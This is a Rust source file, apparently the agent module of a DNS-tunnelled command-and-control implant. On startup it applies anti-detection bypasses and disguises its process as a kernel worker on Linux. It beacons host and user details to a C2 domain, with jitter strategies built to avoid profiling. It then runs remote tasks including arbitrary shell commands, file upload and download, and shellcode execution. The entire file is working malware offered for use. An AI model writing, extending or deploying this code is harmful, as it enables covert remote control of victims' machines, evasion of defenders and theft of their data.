use crate::c2::{self, C2Error, SessionInfo, Task, TaskResponse, TaskStatus};
use crate::crypto::EncryptionKey;
use crate::dns::DnsBackend;
use log::{error, info, warn};
use rand::Rng;

/// Jitter strategy for beacon timing.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum JitterStrategy {
    /// Linear jitter: base +/- (base * pct). Default.
    Linear,
    /// Exponential jitter: base * 2^random(0, pct).
    /// Produces longer tail of sleep times, harder to profile.
    Exponential,
    /// Adaptive jitter: shorter during business hours (09-17),
    /// longer and more random during off-hours.
    Adaptive,
    /// Bursty: occasionally sends multiple rapid beacons,
    /// then goes silent for a longer period.
    Bursty,
}

impl std::str::FromStr for JitterStrategy {
    type Err = String;
    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s.to_lowercase().as_str() {
            "linear" => Ok(JitterStrategy::Linear),
            "exponential" | "exp" => Ok(JitterStrategy::Exponential),
            "adaptive" => Ok(JitterStrategy::Adaptive),
            "bursty" | "burst" => Ok(JitterStrategy::Bursty),
            _ => Err(format!(
                "unknown jitter strategy: {s} (try: linear, exponential, adaptive, bursty)"
            )),
        }
    }
}

impl std::fmt::Display for JitterStrategy {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            JitterStrategy::Linear => write!(f, "linear"),
            JitterStrategy::Exponential => write!(f, "exponential"),
            JitterStrategy::Adaptive => write!(f, "adaptive"),
            JitterStrategy::Bursty => write!(f, "bursty"),
        }
    }
}

pub struct AgentConfig {
    pub domain: String,
    pub key: EncryptionKey,
    pub session_id: String,
    pub poll_interval_secs: u64,
    pub jitter_pct: f64, // 0.0 - 1.0
    pub jitter_strategy: JitterStrategy,
}

pub async fn run(
    backend: &dyn DnsBackend,
    config: &AgentConfig,
) -> Result<(), C2Error> {
    // Apply evasion on startup
    #[cfg(target_os = "windows")]
    {
        crate::evasion::runtime::windows::apply_all_bypasses();
    }
    #[cfg(target_os = "linux")]
    {
        crate::evasion::runtime::linux::mask_process_name("[kworker/0:1-events]");
    }

    // Check in
    let info = SessionInfo {
        session_id: config.session_id.clone(),
        hostname: get_hostname(),
        username: get_username(),
        os: get_os(),
        arch: std::env::consts::ARCH.to_string(),
        pid: std::process::id(),
        first_seen: now(),
        last_seen: now(),
    };

    c2::check_in(backend, &config.domain, &config.key, &info).await?;
    info!("checked in: session={}", config.session_id);

    let mut burst_counter: u32 = 0;

    // Main loop
    loop {
        match c2::poll_task(backend, &config.domain, &config.key, &config.session_id).await {
            Ok(Some(task)) => {
                info!("task: {} [{}]", task.command, task.task_id);

                let response = execute(&task);

                if let Err(e) = c2::submit_response(
                    backend,
                    &config.domain,
                    &config.key,
                    &config.session_id,
                    &response,
                )
                .await
                {
                    error!("failed to submit response: {e}");
                }

                if let Err(e) =
                    c2::clear_task(backend, &config.domain, &config.session_id).await
                {
                    warn!("failed to clear task: {e}");
                }

                if task.command == "exit" {
                    info!("exit received, shutting down");
                    break;
                }
            }
            Ok(None) => {
                // No task — heartbeat
                if let Err(e) = c2::heartbeat(
                    backend,
                    &config.domain,
                    &config.key,
                    &config.session_id,
                )
                .await
                {
                    warn!("heartbeat failed: {e}");
                }
            }
            Err(e) => {
                warn!("poll error: {e}");
            }
        }

        // Sleep with jitter
        let sleep_secs = apply_jitter(
            config.poll_interval_secs,
            config.jitter_pct,
            config.jitter_strategy,
            &mut burst_counter,
        );
        tokio::time::sleep(tokio::time::Duration::from_secs(sleep_secs)).await;
    }

    Ok(())
}

/// Apply jitter strategy to compute sleep duration.
fn apply_jitter(base_secs: u64, jitter_pct: f64, strategy: JitterStrategy, burst_counter: &mut u32) -> u64 {
    let mut rng = rand::thread_rng();
    let base = base_secs as f64;

    let sleep = match strategy {
        JitterStrategy::Linear => {
            let jitter = base * jitter_pct;
            if jitter > 0.0 {
                base + rng.gen_range(-jitter..jitter)
            } else {
                base
            }
        }
        JitterStrategy::Exponential => {
            let exp = rng.gen_range(0.0..jitter_pct.max(0.01));
            base * 2.0_f64.powf(exp)
        }
        JitterStrategy::Adaptive => {
            // Use hour-of-day to vary behavior
            let epoch_secs = std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_secs();
            let hour = ((epoch_secs % 86400) / 3600) as u32; // UTC hour

            if (9..17).contains(&hour) {
                // Business hours: shorter intervals, small jitter
                let jitter = base * 0.2;
                base + rng.gen_range(-jitter..jitter)
            } else {
                // Off-hours: longer intervals, more random
                let multiplier = rng.gen_range(1.5..4.0);
                base * multiplier + rng.gen_range(0.0..60.0)
            }
        }
        JitterStrategy::Bursty => {
            // 20% chance of burst mode (rapid check-ins)
            if *burst_counter > 0 {
                *burst_counter -= 1;
                // Rapid: 1-3 seconds
                rng.gen_range(1.0..3.0)
            } else if rng.gen_range(0.0..1.0) < 0.2 {
                // Enter burst mode: 3-5 rapid polls
                *burst_counter = rng.gen_range(3..6);
                rng.gen_range(1.0..3.0)
            } else {
                // Normal with extended quiet period after bursts
                let jitter = base * jitter_pct;
                base * 1.5 + rng.gen_range(-jitter..jitter)
            }
        }
    };

    sleep.max(1.0) as u64
}

fn execute(task: &Task) -> TaskResponse {
    let (status, output) = match task.command.as_str() {
        "shell" => c2::commands::shell(&task.args),
        "ls" => c2::commands::ls(&task.args),
        "cat" => c2::commands::cat(&task.args),
        "pwd" => c2::commands::pwd(),
        "whoami" => c2::commands::whoami(),
        "ps" => c2::commands::ps(),
        "env" => c2::commands::env_cmd(),
        "download" => c2::commands::download(&task.args),
        "id" => c2::commands::id(),
        "hostname" => c2::commands::hostname(),
        "netstat" => c2::commands::netstat(),
        "upload" => c2::commands::upload(&task.args),
        "sysinfo" => c2::commands::sysinfo(),
        "execute-shellcode" => c2::commands::execute_shellcode(&task.args),
        "exit" => (TaskStatus::Success, "shutting down".to_string()),
        other => (TaskStatus::Error, format!("unknown command: {other}")),
    };

    TaskResponse {
        task_id: task.task_id.clone(),
        status,
        output,
        timestamp: now(),
    }
}

// ─── Cross-platform system info helpers ───

fn get_hostname() -> String {
    // Try platform-independent approaches first
    #[cfg(target_os = "windows")]
    {
        std::env::var("COMPUTERNAME")
            .unwrap_or_else(|_| "unknown".to_string())
    }

    #[cfg(not(target_os = "windows"))]
    {
        std::fs::read_to_string("/etc/hostname")
            .map(|s| s.trim().to_string())
            .or_else(|_| {
                std::process::Command::new("hostname")
                    .output()
                    .map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string())
            })
            .unwrap_or_else(|_| "unknown".to_string())
    }
}

fn get_username() -> String {
    std::env::var("USER")
        .or_else(|_| std::env::var("LOGNAME"))
        .or_else(|_| std::env::var("USERNAME")) // Windows
        .unwrap_or_else(|_| "unknown".to_string())
}

fn get_os() -> String {
    #[cfg(target_os = "windows")]
    {
        // Use WMIC or systeminfo for Windows version
        std::process::Command::new("cmd")
            .args(["/c", "ver"])
            .output()
            .ok()
            .and_then(|o| {
                let s = String::from_utf8_lossy(&o.stdout).trim().to_string();
                if s.is_empty() { None } else { Some(s) }
            })
            .unwrap_or_else(|| "Windows".to_string())
    }

    #[cfg(target_os = "linux")]
    {
        std::fs::read_to_string("/etc/os-release")
            .ok()
            .and_then(|s| {
                s.lines()
                    .find(|l| l.starts_with("PRETTY_NAME="))
                    .map(|l| {
                        l.trim_start_matches("PRETTY_NAME=")
                            .trim_matches('"')
                            .to_string()
                    })
            })
            .unwrap_or_else(|| std::env::consts::OS.to_string())
    }

    #[cfg(target_os = "macos")]
    {
        std::process::Command::new("sw_vers")
            .arg("-productVersion")
            .output()
            .ok()
            .map(|o| format!("macOS {}", String::from_utf8_lossy(&o.stdout).trim()))
            .unwrap_or_else(|| "macOS".to_string())
    }

    #[cfg(not(any(target_os = "windows", target_os = "linux", target_os = "macos")))]
    {
        std::env::consts::OS.to_string()
    }
}

fn now() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs()
}
